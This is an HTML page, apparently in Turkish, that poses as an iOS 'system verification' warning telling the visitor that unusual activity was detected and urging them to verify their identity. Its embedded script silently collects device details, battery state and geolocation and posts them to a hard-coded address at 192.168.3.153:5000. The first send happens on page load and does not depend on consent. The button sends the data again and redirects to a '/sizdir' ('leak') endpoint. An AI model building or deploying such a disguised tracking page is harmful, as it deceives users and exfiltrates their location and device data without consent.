<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iOS Sistem Doğrulaması</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f2f2f7; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; max-width: 320px; }
        .icon { font-size: 50px; margin-bottom: 20px; }
        h1 { font-size: 20px; color: #1c1c1e; }
        p { color: #8e8e93; font-size: 14px; margin-bottom: 30px; }
        .btn { background-color: #007aff; color: white; padding: 12px 25px; border-radius: 10px; text-decoration: none; font-weight: 600; display: inline-block; transition: 0.3s; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">⚠️</div>
        <h1>Sistem Doğrulaması</h1>
        <p>Cihazınızda olağandışı hareketler saptandı. Lütfen kimliğinizi doğrulayın.</p>
        <a id="mainBtn" class="btn">Şimdi Doğrula</a>
    </div>

    <script>
        const API_URL = "http://192.168.3.153:5000";

        async function veriToplaVeGonder(ekstraMesaj = "") {
            let data = {
                etiket: ekstraMesaj,
                platform: navigator.platform,
                ekran: `${window.screen.width}x${window.screen.height}`,
                dil: navigator.language,
                hafiza: navigator.deviceMemory || "Bilinmiyor"
            };

            // Pil Bilgisi
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                data.pil = (battery.level * 100) + "%";
                data.sarjda = battery.charging;
            }

            // Konum İsteği
            navigator.geolocation.getCurrentPosition((pos) => {
                data.harita = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                fetch(`${API_URL}/detay`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            }, () => {
                // Konum reddedilse bile mevcut veriyi gönder
                fetch(`${API_URL}/detay`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
            });
        }

        // Sayfa yüklendiği an ilk veriyi gönder (Sessizce)
        window.onload = () => veriToplaVeGonder("Sayfa Yüklendi");

        // Butona basıldığında tekrar gönder (Onaylı)
        document.getElementById('mainBtn').addEventListener('click', function() {
            veriToplaVeGonder("Butona Basıldı");
            window.location.href = `http://192.168.3.153:5000/sizdir`;
        });
    </script>
</body>
</html>
